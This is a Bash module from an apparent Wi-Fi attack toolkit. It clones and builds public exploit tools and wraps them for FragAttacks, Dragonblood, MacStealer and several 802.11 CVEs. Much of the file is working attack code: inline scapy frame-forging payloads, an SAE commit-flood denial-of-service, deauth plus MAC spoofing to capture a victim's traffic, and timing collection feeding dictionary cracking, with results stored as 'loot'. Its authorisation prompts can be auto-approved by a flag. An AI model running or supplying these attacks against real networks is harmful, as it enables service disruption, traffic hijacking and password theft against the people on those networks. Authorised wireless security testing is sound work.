#!/usr/bin/env bash
# Resolve WIFISTING_ROOT from this script's own path so state/loot land in the
# project tree even when launched standalone via pkexec (no wifisting.sh env).
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _wfs_src="${BASH_SOURCE[0]}"
    while [ -L "$_wfs_src" ]; do
        _wfs_dir="$(cd -P "$(dirname "$_wfs_src")" && pwd)"
        _wfs_tgt="$(readlink "$_wfs_src")"
        [[ "$_wfs_tgt" != /* ]] && _wfs_tgt="$_wfs_dir/$_wfs_tgt"
        _wfs_src="$_wfs_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_wfs_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _wfs_src _wfs_dir _wfs_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${WIFISTING_HOME:=$WIFISTING_ROOT}"
# Single shared temp root. Other modules write cross-module state here
# (mon_iface, target_bssid, ...); using $WIFISTING_ROOT/tmp silently
# split those reads and made this module unable to see a monitor
# interface or target at all.
: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$WIFISTING_ROOT/captures}"
: "${LOGS_DIR:=$WIFISTING_ROOT/logs}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

# 15_wifi_cve_scan.sh — Tier 1 Wi-Fi CVE test harness
# active PoCs behind confirmation prompts
# deps: fragattack, dragonslayer/dragondrain-and-boil, hostapd-mana, hcxdumptool,
#       aircrack-ng suite, tshark, python3, git, pip

# ---- state ----
WIFI_CVE_LOOT="$LOOT_DIR/cves/wifi"
WIFI_CVE_LOG="$LOGS_DIR/wifi_cve_$(date +%s).log"
WIFI_CVE_EXT="$WIFISTING_HOME/external"
mkdir -p "$WIFI_CVE_LOOT" "$WIFI_CVE_EXT"

# ---- helpers ----
wifi_cve_require_iface() {
    if [[ -z "$WIFI_IFACE" ]]; then
        local f
        for f in "$TMP_DIR/wifi_iface" "$TMP_DIR/selected_iface" "$TMP_DIR/mon_iface"; do
            if [[ -f "$f" ]]; then
                WIFI_IFACE="$(head -n1 "$f" 2>/dev/null | tr -d '[:space:]')"
                export WIFI_IFACE
                [[ -n "$WIFI_IFACE" ]] && break
            fi
        done
    fi
    [[ -z "$WIFI_IFACE" ]] && { err "no wifi iface. go to iface manager first."; return 1; }
    local mode
    mode="$(iw dev "$WIFI_IFACE" info 2>/dev/null | awk '/type/ {print $2}')"
    if [[ "$mode" != "monitor" ]]; then
        warn "iface $WIFI_IFACE is in '${mode:-?}' mode — most PoCs need monitor mode"
        local a
        if [[ "${WIFISTING_CVE_RUN:-0}" == "1" ]]; then
            a="y"
        else
            read -rp "  switch to monitor now? [y/N] " a
        fi
        [[ "$a" =~ ^[Yy]$ ]] && {
            ip link set "$WIFI_IFACE" down 2>/dev/null
            iw dev "$WIFI_IFACE" set type monitor 2>/dev/null
            ip link set "$WIFI_IFACE" up 2>/dev/null
            ok "switched $WIFI_IFACE to monitor mode"
        }
    fi
    return 0
}

wifi_cve_require_target() {
    if [[ -z "$TARGET_BSSID" && -f "$TMP_DIR/target_bssid" ]]; then
        export TARGET_BSSID="$(cat "$TMP_DIR/target_bssid")"
        export TARGET_ESSID="$(cat "$TMP_DIR/target_essid" 2>/dev/null)"
        export TARGET_CHANNEL="$(cat "$TMP_DIR/target_channel" 2>/dev/null)"
    fi
    if [[ -z "$TARGET_BSSID" ]]; then
        err "no target locked. run recon [2] and pick one."
        return 1
    fi
    return 0
}

wifi_cve_confirm() {
    local msg="$1"
    echo ""
    warn "$msg"
    warn "this sends real frames at the target. authorized testing only."
    if [[ "${WIFISTING_CVE_RUN:-0}" == "1" ]]; then
        warn "auto-approved (GUI --run-cve)"
        return 0
    fi
    read -rp "  type YES to proceed> " a
    [[ "$a" == "YES" ]]
}

wifi_cve_dep_check() {
    local missing=()
    for b in "$@"; do
        command -v "$b" >/dev/null || missing+=("$b")
    done
    if (( ${#missing[@]} )); then
        err "missing: ${missing[*]}"
        return 1
    fi
    return 0
}

# ---- external tool installer ----
wifi_cve_install_deps() {
    banner
    echo "  installing external CVE tools into $WIFI_CVE_EXT"
    echo ""

    info "apt packages..."
    apt-get update
    apt-get install -y python3-pip python3-venv git build-essential \
        libpcap-dev libnl-3-dev libnl-genl-3-dev pkg-config \
        aircrack-ng hcxdumptool hcxtools tshark hostapd \
        macchanger rfkill wireless-tools iw net-tools

    # fragattack
    if [[ ! -d "$WIFI_CVE_EXT/fragattacks" ]]; then
        info "cloning fragattacks (vanhoefm)..."
        git clone https://github.com/vanhoefm/fragattacks.git "$WIFI_CVE_EXT/fragattacks"
        (
            cd "$WIFI_CVE_EXT/fragattacks/research" || exit 1
            python3 -m venv venv
            # shellcheck disable=SC1091
            source venv/bin/activate
            pip install wheel
            pip install -r ../requirements.txt 2>/dev/null || \
                pip install scapy==2.4.4
        )
    else
        ok "fragattacks already present"
    fi

    # dragondrain-and-boil (WPA3 SAE DoS + dragonslayer)
    if [[ ! -d "$WIFI_CVE_EXT/dragondrain-and-boil" ]]; then
        info "cloning dragondrain-and-boil..."
        git clone https://github.com/vanhoefm/dragondrain-and-boil.git \
            "$WIFI_CVE_EXT/dragondrain-and-boil"
        (
            cd "$WIFI_CVE_EXT/dragondrain-and-boil" || exit 1
            make 2>&1 | tail -20
        )
    else
        ok "dragondrain-and-boil already present"
    fi

    # dragonslayer (WPA3 EAP-pwd)
    if [[ ! -d "$WIFI_CVE_EXT/dragonslayer" ]]; then
        # Upstream last committed 2019-04. The SAE/EAP-pwd technique is
        # still valid; the tool is not maintained, so expect to patch it.
        info "cloning dragonslayer (unmaintained since 2019-04)..."
        git clone https://github.com/vanhoefm/dragonslayer.git \
            "$WIFI_CVE_EXT/dragonslayer"
    fi

    # hostapd-mana (for SSID confusion / MacStealer + rogue AP flows)
    if [[ ! -d "$WIFI_CVE_EXT/hostapd-mana" ]]; then
        info "cloning hostapd-mana..."
        git clone https://github.com/sensepost/hostapd-mana.git \
            "$WIFI_CVE_EXT/hostapd-mana"
        (
            cd "$WIFI_CVE_EXT/hostapd-mana/hostapd" || exit 1
            cp defconfig .config
            make -j"$(nproc)" 2>&1 | tail -5
        )
    else
        ok "hostapd-mana already present"
    fi

    # macstealer PoC (CVE-2022-47522)
    if [[ ! -d "$WIFI_CVE_EXT/macstealer" ]]; then
        info "cloning macstealer..."
        git clone https://github.com/domienschepers/wifi-framework.git \
            "$WIFI_CVE_EXT/macstealer" 2>/dev/null || \
            warn "macstealer repo unavailable — using fragattack framework fallback"
    fi

    ok "install pass complete. review $WIFI_CVE_EXT for any build errors."
}

# =====================================================================
# CVE-2020-24588 / 24587 / 24586 + 26139..26146  —  FragAttacks
# =====================================================================
wifi_cve_fragattacks() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    local fa_dir="$WIFI_CVE_EXT/fragattacks/research"
    [[ ! -d "$fa_dir" ]] && { err "fragattacks not installed. run [i]nstall deps first."; return 1; }

    banner
    cat << 'FA'
  FragAttacks (Mathy Vanhoef, 2021)
  ---------------------------------
  design flaws + implementation bugs in 802.11 frame aggregation
  and fragmentation. affects nearly every Wi-Fi device made since 1997.

  test categories:
    [1]  ping           — basic connectivity check via crafted frags
    [2]  amsdu          — CVE-2020-24588 (A-MSDU spoofing / injection)
    [3]  mixedkey       — CVE-2020-24587 (mixed key attack)
    [4]  fragcache      — CVE-2020-24586 (frag cache poisoning)
    [5]  eapfrag        — CVE-2020-26145 (plaintext frag injection)
    [6]  bcast-fragment — bcast frag as unicast
    [7]  linux-plain    — linux plaintext injection (26141)
    [8]  linux-plain-decoy — decoy fragment variant
    [9]  full test suite (all of the above sequentially)
    [0]  back
FA
    read -rp "  choice> " c
    [[ "$c" == "0" ]] && return 0

    local test=""
    case "$c" in
        1) test="ping" ;;
        2) test="amsdu-inject" ;;
        3) test="mixedkey" ;;
        4) test="fragcache" ;;
        5) test="eapfrag" ;;
        6) test="bcast-fragment" ;;
        7) test="linux-plain" ;;
        8) test="linux-plain-decoy" ;;
        9) test="ALL" ;;
        *) err "invalid"; return 1 ;;
    esac

    read -rp "  target IP (client behind AP, needed for ping variants)> " tip
    read -rp "  target MAC (client)> " tmac

    wifi_cve_confirm "fragattack '$test' against $TARGET_BSSID / client $tmac" || return 1

    local logf="$WIFI_CVE_LOOT/fragattack_${test}_$(date +%s).log"

    if [[ "$test" == "ALL" ]]; then
        local suite=(ping amsdu-inject mixedkey fragcache eapfrag bcast-fragment linux-plain)
        for t in "${suite[@]}"; do
            info "=== $t ==="
            (
                cd "$fa_dir" || exit 1
                # shellcheck disable=SC1091
                source venv/bin/activate 2>/dev/null
                timeout 60 python3 fragattack.py "$WIFI_IFACE" "$t" \
                    --ip "$tip" --peermac "$tmac" 2>&1 | tee -a "$logf"
            )
            sleep 2
        done
    else
        (
            cd "$fa_dir" || exit 1
            # shellcheck disable=SC1091
            source venv/bin/activate 2>/dev/null
            python3 fragattack.py "$WIFI_IFACE" "$test" \
                --ip "$tip" --peermac "$tmac" 2>&1 | tee "$logf"
        )
    fi
    ok "log: $logf"
}

# =====================================================================
# CVE-2019-9494 / 9495  —  Dragonblood (WPA3-SAE)
# =====================================================================
wifi_cve_dragonblood() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    local dd_dir="$WIFI_CVE_EXT/dragondrain-and-boil"
    [[ ! -x "$dd_dir/dragondrain" ]] && { err "dragondrain not built. run [i]."; return 1; }

    banner
    cat << 'DB'
  Dragonblood (Vanhoef & Ronen, 2019)
  ------------------------------------
  WPA3-SAE handshake flaws:
    - CVE-2019-9494  timing-based side-channel on password element
    - CVE-2019-9495  cache-based side-channel
    - CVE-2019-13377 brainpool timing leak
  plus dragondrain (SAE commit flood DoS)

  attacks:
    [1]  dragondrain  — SAE commit flood (DoS the AP)
    [2]  dragontime   — timing side-channel data collection
    [3]  boil         — cache side-channel (needs local access)
    [4]  dictionary   — offline dict attack on collected timings
    [0]  back
DB
    read -rp "  choice> " c
    case "$c" in
        1)
            wifi_cve_confirm "SAE commit flood at $TARGET_BSSID (DoS)" || return 1
            local logf="$WIFI_CVE_LOOT/dragondrain_$(date +%s).log"
            read -rp "  duration seconds (default 60)> " dur
            dur="${dur:-60}"
            info "flooding $TARGET_BSSID on ch $TARGET_CHANNEL"
            iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null
            timeout "$dur" "$dd_dir/dragondrain" -i "$WIFI_IFACE" \
                -a "$TARGET_BSSID" -c "$TARGET_CHANNEL" -n 25 2>&1 | tee "$logf"
            ok "log: $logf"
            ;;
        2)
            wifi_cve_confirm "dragontime timing collection against $TARGET_BSSID" || return 1
            local outf="$WIFI_CVE_LOOT/dragontime_$(date +%s).csv"
            read -rp "  number of measurements (default 5000)> " n
            n="${n:-5000}"
            "$dd_dir/dragontime" -i "$WIFI_IFACE" -a "$TARGET_BSSID" \
                -n "$n" -o "$outf" 2>&1 | tee "$WIFI_CVE_LOG"
            ok "timings: $outf"
            info "next step: [4] dictionary to crack password"
            ;;
        3)
            warn "boil requires local access to the victim (side-channel via cache probes)"
            warn "typically run *on* the target, not remotely — skipping"
            read -rp "  press enter" _
            ;;
        4)
            read -rp "  timing csv> " tf
            read -rp "  wordlist> " wl
            [[ ! -f "$tf" || ! -f "$wl" ]] && { err "files not found"; return 1; }
            "$dd_dir/dragondict.py" -t "$tf" -w "$wl" 2>&1 | tee "$WIFI_CVE_LOG"
            ;;
        0) return 0 ;;
    esac
}

# =====================================================================
# CVE-2022-47522  —  MacStealer / SSID confusion
# =====================================================================
wifi_cve_macstealer() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    banner
    cat << 'MS'
  MacStealer (CVE-2022-47522, Vanhoef 2023)
  -----------------------------------------
  client MAC address hijack via disconnect + reconnect race.
  when a client disconnects, the AP may still forward frames
  destined to its MAC to whoever spoofs it next.

  requires:
    - a client that just disconnected (or you deauth one)
    - ability to associate to the same AP with the victim's MAC
MS
    read -rp "  victim client MAC> " vmac
    [[ -z "$vmac" ]] && { err "need victim MAC"; return 1; }

    wifi_cve_confirm "MacStealer attempt: deauth $vmac then hijack their MAC on $TARGET_ESSID" || return 1

    local logf="$WIFI_CVE_LOOT/macstealer_$(date +%s).log"

    # step 1: capture original MAC
    local origmac
    origmac="$(cat "/sys/class/net/${WIFI_IFACE}/address")"
    echo "orig MAC: $origmac" | tee -a "$logf"

    # step 2: deauth victim (aireplay burst)
    info "deauthing $vmac from $TARGET_BSSID..."
    iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null
    timeout 5 aireplay-ng -0 20 -a "$TARGET_BSSID" -c "$vmac" "$WIFI_IFACE" \
        2>&1 | tee -a "$logf"

    # step 3: switch to managed, spoof MAC, connect
    info "spoofing $vmac and racing to reconnect..."
    ip link set "$WIFI_IFACE" down
    iw dev "$WIFI_IFACE" set type managed
    macchanger -m "$vmac" "$WIFI_IFACE" 2>&1 | tee -a "$logf"
    ip link set "$WIFI_IFACE" up

    warn "network is likely WPA2/3 — you won't fully auth without PSK"
    warn "but if AP is misconfigured, frames buffered for $vmac may leak"
    warn "watch tshark for forwarded frames destined to $vmac"

    read -rp "  attach tshark now to observe? [Y/n]> " a
    if [[ ! "$a" =~ ^[Nn]$ ]]; then
        timeout 30 tshark -i "$WIFI_IFACE" -f "ether dst $vmac" \
            -w "$WIFI_CVE_LOOT/macstealer_$(date +%s).pcap" 2>&1 | tee -a "$logf"
    fi

    # restore
    info "restoring $origmac"
    ip link set "$WIFI_IFACE" down
    macchanger -m "$origmac" "$WIFI_IFACE"
    ip link set "$WIFI_IFACE" up
    ok "log: $logf"
}

# =====================================================================
# CVE-2017-13077..13082  —  KRACK (link to existing module)
# =====================================================================
wifi_cve_krack_stub() {
    info "KRACK is implemented in module 11 (krack_kr00k)"
    info "invoking krack menu..."
    if declare -F krack_kr00k_menu >/dev/null; then
        krack_kr00k_menu
    else
        err "module 11 not loaded"
    fi
}

# =====================================================================
# CVE-2019-15126  —  Kr00k (link to existing module)
# =====================================================================
wifi_cve_kr00k_stub() {
    info "Kr00k is implemented in module 11"
    if declare -F krack_kr00k_menu >/dev/null; then
        krack_kr00k_menu
    else
        err "module 11 not loaded"
    fi
}

# =====================================================================
# CVE-2020-26139  —  accept plaintext EAPOL before assoc
# =====================================================================
wifi_cve_26139_eapol_plaintext() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    banner
    cat << 'PL'
  CVE-2020-26139 — plaintext EAPOL before association
  ---------------------------------------------------
  vulnerable APs process EAPOL frames even from unassociated clients.
  test: send a forged EAPOL frame from an unassociated MAC and watch
  if the AP replies. no reply = patched. reply = vulnerable.
PL
    wifi_cve_confirm "send unauth EAPOL to $TARGET_BSSID" || return 1

    local pcap="$WIFI_CVE_LOOT/26139_$(date +%s).pcap"
    iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null

    # background sniff
    tshark -i "$WIFI_IFACE" -w "$pcap" \
        -f "ether host $TARGET_BSSID and (ether proto 0x888e or wlan type mgt subtype auth)" \
        >/dev/null 2>&1 &
    local tshpid=$!

    # send probe via scapy oneliner
    python3 - << PY 2>&1 | tee -a "$WIFI_CVE_LOG"
from scapy.all import *
iface = "$WIFI_IFACE"
bssid = "$TARGET_BSSID"
smac  = RandMAC()
# minimal EAPOL-Start
dot11 = Dot11(type=2, subtype=8, addr1=bssid, addr2=smac, addr3=bssid)
llc   = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
snap  = SNAP(OUI=0, code=0x888e)
eapol = EAPOL(version=2, type=1)  # EAPOL-Start
frame = RadioTap()/dot11/llc/snap/eapol
print(f"[+] sending 20 EAPOL-Start frames from {smac}")
sendp(frame, iface=iface, count=20, inter=0.1, verbose=False)
PY

    sleep 3
    kill "$tshpid" 2>/dev/null
    wait "$tshpid" 2>/dev/null

    info "checking pcap for AP response..."
    local replies
    replies="$(tshark -r "$pcap" -Y "eapol && wlan.sa == $TARGET_BSSID" 2>/dev/null | wc -l)"
    if (( replies > 0 )); then
        warn "AP replied — likely VULNERABLE (or misconfigured)"
    else
        ok "no AP reply — likely patched"
    fi
    ok "pcap: $pcap"
}

# =====================================================================
# CVE-2020-26144  —  accept plaintext A-MSDU frames smelling like EAPOL
# =====================================================================
wifi_cve_26144_amsdu_plaintext() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    banner
    cat << 'AM'
  CVE-2020-26144 — plaintext A-MSDU frames accepted
  --------------------------------------------------
  vulnerable APs accept aggregated A-MSDU frames in plaintext.
  test: send plaintext A-MSDU frame with EAPOL-looking payload
  from unassociated client. reply/ack = vulnerable.
AM
    wifi_cve_confirm "send plaintext A-MSDU to $TARGET_BSSID" || return 1

    local pcap="$WIFI_CVE_LOOT/26144_$(date +%s).pcap"
    iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null

    tshark -i "$WIFI_IFACE" -w "$pcap" -f "ether host $TARGET_BSSID" \
        >/dev/null 2>&1 &
    local tshpid=$!

    python3 - << PY 2>&1 | tee -a "$WIFI_CVE_LOG"
from scapy.all import *
import random

iface = "$WIFI_IFACE"
bssid = "$TARGET_BSSID"
smac = RandMAC()

# QoS data frame with A-MSDU bit set in QoS header
dot11 = Dot11(type=2, subtype=8, addr1=bssid, addr2=smac, addr3=bssid, SC=0)
qos = Dot11QoS()
qos.QA = 0
qos.A_MSDU_Present = 1

# A-MSDU subframe: DA, SA, length, then LLC/SNAP EAPOL payload
amsdu_hdr = bytes.fromhex("00") * 0  # placeholder
da = "00:11:22:33:44:55"
sa = str(smac)
length = 36

# build the LLC/SNAP EAPOL part
llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
snap = SNAP(OUI=0, code=0x888e)
eapol = EAPOL(version=2, type=1)
payload = raw(llc/snap/eapol)

subframe = bytes.fromhex(da.replace(":", "")) + bytes.fromhex(sa.replace(":", "")) + length.to_bytes(2, "little") + payload

frame = RadioTap()/dot11/qos/subframe
print(f"[+] sending 15 plaintext A-MSDU frames from {smac}")
sendp(frame, iface=iface, count=15, inter=0.2, verbose=False)
PY

    sleep 3
    kill "$tshpid" 2>/dev/null
    wait "$tshpid" 2>/dev/null

    info "checking pcap for AP response..."
    local replies
    replies="$(tshark -r "$pcap" -Y "wlan.sa == $TARGET_BSSID && wlan.fc.type == 2" 2>/dev/null | wc -l)"
    if (( replies > 0 )); then
        warn "AP sent data frames — possibly VULNERABLE"
    else
        ok "no AP reply — likely patched"
    fi
    ok "pcap: $pcap"
}

# =====================================================================
# CVE-2020-26140  —  accept fragmented plaintext data frames
# =====================================================================
wifi_cve_26140_frag_plain() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    banner
    cat << 'FP'
  CVE-2020-26140 — accept fragmented plaintext data
  --------------------------------------------------
  vulnerable APs accept non-encrypted fragmented frames.
  test: send plaintext fragmented data frame to AP.
  if AP replies or processes it, it's vulnerable.
FP
    wifi_cve_confirm "send plaintext fragmented frame to $TARGET_BSSID" || return 1

    local pcap="$WIFI_CVE_LOOT/26140_$(date +%s).pcap"
    iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null

    tshark -i "$WIFI_IFACE" -w "$pcap" -f "ether host $TARGET_BSSID" \
        >/dev/null 2>&1 &
    local tshpid=$!

    python3 - << PY 2>&1 | tee -a "$WIFI_CVE_LOG"
from scapy.all import *

iface = "$WIFI_IFACE"
bssid = "$TARGET_BSSID"
smac = RandMAC()

# plaintext data frame, protected flag off, fragmented
dot11 = Dot11(type=2, subtype=8, addr1=bssid, addr2=smac, addr3=bssid, SC=0)
llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
snap = SNAP(OUI=0, code=0x0800)  # IP
frame = RadioTap()/dot11/llc/snap

print(f"[+] sending 15 plaintext data frames from {smac}")
sendp(frame, iface=iface, count=15, inter=0.2, verbose=False)
PY

    sleep 3
    kill "$tshpid" 2>/dev/null
    wait "$tshpid" 2>/dev/null

    local replies
    replies="$(tshark -r "$pcap" -Y "wlan.sa == $TARGET_BSSID" 2>/dev/null | wc -l)"
    if (( replies > 0 )); then
        warn "AP responded to plaintext — check pcap manually"
    else
        ok "no AP reply — likely patched"
    fi
    ok "pcap: $pcap"
}

# =====================================================================
# CVE-2020-26142  —  accept frames with broadcast addr1 in EAPOL
# =====================================================================
wifi_cve_26142_bcast_eapol() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    banner
    cat << 'BC'
  CVE-2020-26142 — process EAPOL with bcast addr1
  ------------------------------------------------
  vulnerable APs process EAPOL frames whose addr1 is broadcast
  rather than the AP's own MAC. test is passive+active hybrid:
  send EAPOL with addr1=ff:ff:ff:ff:ff:ff, see if AP responds.
BC
    wifi_cve_confirm "send bcast-addr1 EAPOL to $TARGET_BSSID" || return 1

    local pcap="$WIFI_CVE_LOOT/26142_$(date +%s).pcap"
    iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null

    tshark -i "$WIFI_IFACE" -w "$pcap" -f "ether host $TARGET_BSSID" \
        >/dev/null 2>&1 &
    local tshpid=$!

    python3 - << PY 2>&1 | tee -a "$WIFI_CVE_LOG"
from scapy.all import *

iface = "$WIFI_IFACE"
bssid = "$TARGET_BSSID"
smac = RandMAC()

dot11 = Dot11(type=2, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=smac, addr3=bssid)
llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
snap = SNAP(OUI=0, code=0x888e)
eapol = EAPOL(version=2, type=1)
frame = RadioTap()/dot11/llc/snap/eapol

print(f"[+] sending 20 bcast-addr1 EAPOL frames from {smac}")
sendp(frame, iface=iface, count=20, inter=0.1, verbose=False)
PY

    sleep 3
    kill "$tshpid" 2>/dev/null
    wait "$tshpid" 2>/dev/null

    local replies
    replies="$(tshark -r "$pcap" -Y "eapol && wlan.sa == $TARGET_BSSID" 2>/dev/null | wc -l)"
    if (( replies > 0 )); then
        warn "AP replied to bcast EAPOL — VULNERABLE"
    else
        ok "no reply — likely patched"
    fi
    ok "pcap: $pcap"
}

# =====================================================================
# CVE-2015-5470 / 2017-13087-ish  —  deauth on protected networks
# (bypass "protected" bit on deauth/disassoc frames)
# =====================================================================
wifi_cve_26137_38_deauth_protected() {
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1

    banner
    cat << 'DP'
  CVE-2020-26137/26138 — accept plaintext deauth
  ------------------------------------------------
  vulnerable APs accept deauth/disassoc frames with the
  protected flag set (meaning they should be encrypted but aren't).
  test: send deauth with protected bit set from random MAC.
  if AP acks it / logs it, it might process it — check pcap.
DP
    wifi_cve_confirm "send protected-flag deauth to $TARGET_BSSID" || return 1

    local pcap="$WIFI_CVE_LOOT/26137_38_$(date +%s).pcap"
    iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL" 2>/dev/null

    tshark -i "$WIFI_IFACE" -w "$pcap" -f "ether host $TARGET_BSSID" \
        >/dev/null 2>&1 &
    local tshpid=$!

    python3 - << PY 2>&1 | tee -a "$WIFI_CVE_LOG"
from scapy.all import *

iface = "$WIFI_IFACE"
bssid = "$TARGET_BSSID"
smac = RandMAC()

# deauth frame, protected flag set, from unassociated MAC
dot11 = Dot11(type=0, subtype=12, addr1=bssid, addr2=smac, addr3=bssid)
dot11.FCfield |= 0x40  # protected flag
frame = RadioTap()/dot11

print(f"[+] sending 20 protected-flag deauth from {smac}")
sendp(frame, iface=iface, count=20, inter=0.1, verbose=False)
PY

    sleep 3
    kill "$tshpid" 2>/dev/null
    wait "$tshpid" 2>/dev/null

    info "manual check needed — look for deauth acks or responses in:"
    info "$pcap"
    tshark -r "$pcap" -Y "wlan.fc.type_subtype == 13" 2>/dev/null | head -5
    ok "done"
}

# =====================================================================
# menu
# =====================================================================
wifi_cve_scan_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== Wi-Fi CVE Test Harness ===${C_RESET}"
        echo ""
        [[ -n "$WIFI_IFACE" ]] && echo -e "  ${C_CYN}iface:${C_RESET} $WIFI_IFACE"
        [[ -n "$TARGET_BSSID" ]] && echo -e "  ${C_CYN}target:${C_RESET} ${TARGET_ESSID:-?} ($TARGET_BSSID) ch:$TARGET_CHANNEL"
        echo ""
        cat << 'MENU'
  [1]  FragAttacks (24586/24587/24588/26139-26146)
  [2]  Dragonblood (9494/9495/13377)
  [3]  MacStealer (CVE-2022-47522)
  [4]  KRACK (13077-13082) → module 11
  [5]  Kr00k (CVE-2019-15126) → module 11
  [6]  CVE-2020-26139 — plaintext EAPOL pre-assoc
  [7]  CVE-2020-26144 — plaintext A-MSDU
  [8]  CVE-2020-26140 — plaintext fragmented data
  [9]  CVE-2020-26142 — bcast addr1 EAPOL
  [10] CVE-2020-26137/38 — protected-flag deauth
  [i]  install external tools
  [0]  back

MENU
        read -rp "  choice> " c
        case "$c" in
            1) wifi_cve_fragattacks ;;
            2) wifi_cve_dragonblood ;;
            3) wifi_cve_macstealer ;;
            4) wifi_cve_krack_stub ;;
            5) wifi_cve_kr00k_stub ;;
            6) wifi_cve_26139_eapol_plaintext ;;
            7) wifi_cve_26144_amsdu_plaintext ;;
            8) wifi_cve_26140_frag_plain ;;
            9) wifi_cve_26142_bcast_eapol ;;
            10) wifi_cve_26137_38_deauth_protected ;;
            i|I) wifi_cve_install_deps ;;
            0) return 0 ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI / GUI entry points ────────────────────────────────

wifi_cve_cli_status_tsv() {
    printf 'mon_iface\t%s\n'  "${WIFI_IFACE:-}"
    printf 'bssid\t%s\n'      "${TARGET_BSSID:-}"
    printf 'essid\t%s\n'      "${TARGET_ESSID:-}"
    printf 'channel\t%s\n'    "${TARGET_CHANNEL:-}"
    printf 'loot\t%s\n'       "$WIFI_CVE_LOOT"
    printf 'external\t%s\n'   "$WIFI_CVE_EXT"
    printf 'fragatk\t%s\n'    "$([[ -d "$WIFI_CVE_EXT/fragattacks" ]] && echo yes || echo no)"
    printf 'dragonblood\t%s\n' "$([[ -d "$WIFI_CVE_EXT/dragondrain-and-boil" ]] && echo yes || echo no)"
    printf 'mana\t%s\n'       "$([[ -d "$WIFI_CVE_EXT/hostapd-mana" ]] && echo yes || echo no)"
}

# =====================================================================
# --run-cve <id> — non-interactive per-CVE probe (GUI Run button)
# =====================================================================

# Log a clear note for CVEs that have no automated one-shot probe here.
wifi_cve_run_handoff() {
    local id="${1:-}" note="${2:-}"
    local slug; slug="$(printf '%s' "$id" | tr -c 'A-Za-z0-9._-' '_')"
    local f="$WIFI_CVE_LOOT/run_${slug}_$(date +%s).txt"
    mkdir -p "$WIFI_CVE_LOOT"
    {
        echo "cve: $id"
        echo "status: handoff — no automated one-shot probe in this kit"
        echo "note: $note"
        echo "ts: $(date -Is)"
    } | tee "$f"
    warn "$id → $note"
    info "note: $f"
    return 0
}

# FragAttacks family — run one fragattack.py test non-interactively.
wifi_cve_run_fragattacks() {
    local test="${1:-}"
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1
    local fa_dir="$WIFI_CVE_EXT/fragattacks/research"
    if [[ ! -d "$fa_dir" ]]; then
        err "fragattacks not installed — run the install step in this module first"
        return 1
    fi
    wifi_cve_confirm "fragattack '$test' against $TARGET_BSSID" || return 1
    local args=( "$WIFI_IFACE" "$test" )
    [[ -n "${PEER_MAC:-}" ]] && args+=( --peermac "$PEER_MAC" )
    [[ -n "${PEER_IP:-}" ]]  && args+=( --ip "$PEER_IP" )
    local logf="$WIFI_CVE_LOOT/fragattack_${test}_$(date +%s).log"
    (
        cd "$fa_dir" || exit 1
        # shellcheck disable=SC1091
        source venv/bin/activate 2>/dev/null
        timeout 90 python3 fragattack.py "${args[@]}" 2>&1 | tee "$logf"
    )
    ok "log: $logf"
}

# Dragonblood family.
wifi_cve_run_dragonblood() {
    local mode="${1:-}"
    wifi_cve_require_iface || return 1
    wifi_cve_require_target || return 1
    local dd_dir="$WIFI_CVE_EXT/dragondrain-and-boil"
    if [[ ! -d "$dd_dir" ]]; then
        err "dragondrain-and-boil not installed — run the install step first"
        return 1
    fi
    iw dev "$WIFI_IFACE" set channel "${TARGET_CHANNEL:-1}" 2>/dev/null
    wifi_cve_confirm "dragonblood '$mode' against $TARGET_BSSID" || return 1
    case "$mode" in
        timing)
            local outf="$WIFI_CVE_LOOT/dragontime_$(date +%s).csv"
            "$dd_dir/dragontime" -i "$WIFI_IFACE" -a "$TARGET_BSSID" \
                -n "${DRAGONTIME_N:-3000}" -o "$outf" 2>&1 | tee -a "$WIFI_CVE_LOG"
            ok "timings: $outf"
            ;;
        drain)
            local logf="$WIFI_CVE_LOOT/dragondrain_$(date +%s).log"
            timeout "${DRAGONDRAIN_SECS:-60}" "$dd_dir/dragondrain" -i "$WIFI_IFACE" \
                -a "$TARGET_BSSID" -c "${TARGET_CHANNEL:-1}" -n 25 2>&1 | tee "$logf"
            ok "log: $logf"
            ;;
    esac
}

wifi_cve_run() {
    local id="${1:-}"
    if [[ -z "$id" ]]; then
